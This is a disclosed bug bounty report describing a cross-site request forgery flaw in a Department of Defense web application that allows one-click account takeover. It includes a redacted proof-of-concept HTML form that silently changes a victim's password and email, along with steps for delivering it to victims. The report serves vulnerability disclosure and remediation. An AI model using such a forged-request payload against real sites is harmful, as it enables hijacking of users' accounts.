# CSRF - Modify User Settings with one click - Account TakeOver

## Report Details
- **Report ID**: 799895
- **URL**: https://hackerone.com/reports/799895
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-19T16:39:46.127Z
- **Disclosed**: 2022-03-18T19:03:13.236Z

## Reporter
- **Username**: ahmd_halabi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Target Url**
https://█████

**Summary:**
This CSRF is sensitive, similar to the old one #799855 , here attacker can change user name, email, and password with just one click from user.
I think its severity should be greater than Medium (High) since it doesn't require any user interaction but only just being authenticated to the target url.

## Step-by-step Reproduction Instructions

1. Login to your account.
2. To generate the html code: You can click on save button in edit Profile section and intercept the request -> Engagement Tools -> Generate CSRF PoC.
3. Copy and paste the generated code to html file 
```
<html>
  <body>
    <form action="https://███" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="action" value="save&#95;info" />
      <input type="hidden" name="password&#91;original&#93;" value="█████████" />
      <input type="hidden" name="password&#91;confirmed&#93;" value="██████████" />
      <input type="hidden" name="email&#91;original&#93;" value="███████" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
Open the file in browser, click the button and the profile info will be changed successfully.

## Suggested Mitigation/Remediation Actions
Add a csrf-token in the header or in an hidden input to check if the user that is doing this action authorized or not.

## Impact

This action is critical and sensitive. Attacker can upload this file to a url. Sends it to the victims. And when the authenticated victims navigate to the url their accounts details (username, email, password) will change.
Attacker will undergo successful Account Takeover.

## Attachments
No attachments
